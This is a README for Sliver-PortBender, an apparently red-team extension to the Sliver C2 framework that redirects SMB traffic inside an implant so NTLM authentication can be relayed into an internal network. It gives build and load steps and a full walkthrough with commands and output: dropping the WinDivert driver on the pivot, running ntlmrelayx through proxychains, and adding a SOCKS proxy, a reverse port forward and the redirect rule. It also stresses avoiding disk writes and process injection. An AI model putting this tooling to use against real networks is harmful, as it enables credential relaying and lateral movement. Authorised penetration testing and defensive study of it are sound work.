# Sliver-PortBender

An **extension to Sliver C2**, that allows to **manage multiple redirection traffic rules, from port to port, inside the same implant**. 
It maybe useful for performing **NTLM relaying from Sliver C2 into an internal network** in a similar way to what is described here https://rastamouse.me/ntlm-relaying-via-cobalt-strike/ for Cobalt-Strike. I recommend the user to first read the article before in case doesn't have any experience with PortBender.
**The extension is a DLL wrapping the PortBender Reflective DLL** developed by praetorian-inc here: https://github.com/praetorian-inc/PortBender. Sliver-PortBender performs the same redirection task, 
performed by the original PortBender, but does everything **inside the same implant with no need to inject into other binaries or drop binaries to disk**.

## How it works

The DLL manages multiple threads each one in charge of redirecting traffic from one port to another one. It keeps a map ID -> thread that allows to destroy/create/list the different
threads. For redirection task most of the code was taken from the original PortBender project and it was refactored in order to not crash the implant.
Even if the **backdoor** command appears as a possible argument, it is actually **not available**.

## How to build it

open the solution file using visual studio 2019, and build the x64 release (I didn't test the x86).

## How to load / install it

Until this is potentially included in the armory it can be built on a windows system and loaded manually in sliver.
Create a directory called sliver-extension and copy inside it SliverPortBender.dll, the binary previously compiled on windows with visual studio, and extension.json:
```
$ mkdir sliver-extension && cd sliver-extension
$ cp /path/to/extension.json .
$ cp /path/to/SliverPortBender.dll .
```

Install and load the extension in sliver-client:
```
> extension install /path/to/sliver-extension
> extension load /path/to/sliver-extension
```

Alternatively you can download the release and use again the `extension install` and `extension load` commands with the folder extracted from the zip in the release. Only x64 version is in the release.

## Usage

Be careful to use it only with **session** type implants. **beacons** in sliver have the issue of reloading everytime the DLL, instead of loading it only the first time it gets executed. I'll perform a PR that fix that behaviour soon.

By running `portbender` you can already get a help message. Here the functionalities:

- `portbender redirect <fakeDstPort> <redirectedPort>` . Redirects the traffic from `<fakeDstPort>` to `<redirectedPort>`
- `portbender list` . List the active redirection rules created with the `redirect command`
- `portbender remove <id>` . Stop and remove a redirection rule with a given `<id>`. The `<id>` is retrieved through the `portbender list`command.

### Example

Here how to use Sliver-Portbender in sliver in order to redirect traffic from port 445 to port 8445 and then relay incoming traffic with ntlmrelayx in the internal network.
Be careful It is first necessary to upload `WinDivert64.sys` in the pivot machine to the path `C:\Windows\System32\drivers`. Later it is necessary to change directory to `C:\Windows\System32\drivers`.

Starting ntlmrelayx:
```

┌──(kali㉿kali)-[~]
└─$ proxychains4 impacket-ntlmrelayx -smb2support -t smb://WIN-ICSQJ44N1F3.contoso.local --no-http-server
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

Creating socks proxy, port forwarding rule and portbender rule in session:

```

[*] Active session RIPE_COUNCILOR (2aff286b-da8d-4636-8f8e-8512f67ab64e)

sliver (RIPE_COUNCILOR) > socks5 start -P 1080

[*] Started SOCKS5 127.0.0.1 1080
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol

sliver (RIPE_COUNCILOR) > cd C:\\Windows\\System32\\Drivers

[*] C:\Windows\System32\Drivers

sliver (RIPE_COUNCILOR) > ls WinDivert64.sys

C:\Windows\System32\Drivers (1 item, 37.0 KiB)
==============================================
-rw-rw-rw-  WinDivert64.sys  37.0 KiB  Sun Dec 11 21:20:20 +0100 2022


sliver (RIPE_COUNCILOR) > rportfwd add -b 0.0.0.0:8445 -r 192.168.161.50:445

[*] Reverse port forwarding 192.168.161.50:445 <- 0.0.0.0:8445

sliver (RIPE_COUNCILOR) > portbender redirect 445 8445

[*] Successfully executed portbender
[*] Got output:
Initializing manager...
Creating redirection with id 0...
Redirection created successfully


sliver (RIPE_COUNCILOR) > portbender list

[*] Successfully executed portbender
[*] Got output:
        id:     ORIGINAL_PORT -> REDIRECTED_PORT        MODE(0=redirect,1=backdoor)     PASSWORD
        0:      445 -> 8445     0


sliver (RIPE_COUNCILOR) > 
```

Generating some traffic towards port 445 on the pivot machine (ip=192.168.161.30) where the implant is running:
```
C:\Users\Administrator>dir \\192.168.161.30\c$
The user name or password is incorrect.

C:\Users\Administrator>
```

Notice ntlmrelayx captured and relayed some traffic towards another machine in the internal network:

![immagine](https://user-images.githubusercontent.com/74059030/208508027-c9e472d8-5b70-4722-a675-f07baf8cf768.png)

Removing the port redirection rule in the sliver implant:
```

sliver (RIPE_COUNCILOR) > portbender remove 0

[*] Successfully executed portbender
[*] Got output:
successfully removed redirection with Id 0


sliver (RIPE_COUNCILOR) > portbender list

[*] Successfully executed portbender
[*] Got output:
Nothing to show


sliver (RIPE_COUNCILOR) >

```

Notice now the previous command used to generate traffic executes successfully, confirming the PortBender rule was removed successfully:

![immagine](https://user-images.githubusercontent.com/74059030/208510154-ffb4c5b6-d9cb-4e0a-8de3-e6cea1a114e8.png)


## Credits

- https://github.com/BishopFox/sliver/wiki/Aliases-&-Extensions#extensions
- https://github.com/praetorian-inc/PortBender
- https://rastamouse.me/ntlm-relaying-via-cobalt-strike/
- https://github.com/trustedsec/SliverKeylogger

## Acknowledgements
Special thanks goes to [@rkervella](https://github.com/rkervella) [@moloch--](https://github.com/moloch--) and the other members of Bishop Fox for their job on Sliver, and to [@praetorian-inc](https://github.com/praetorian-inc) for the original PortBender project. I thank also [@freefirex](https://github.com/freefirex) for his work on Sliver Keylogger. In fact I was insipired by his work when creating the extension.
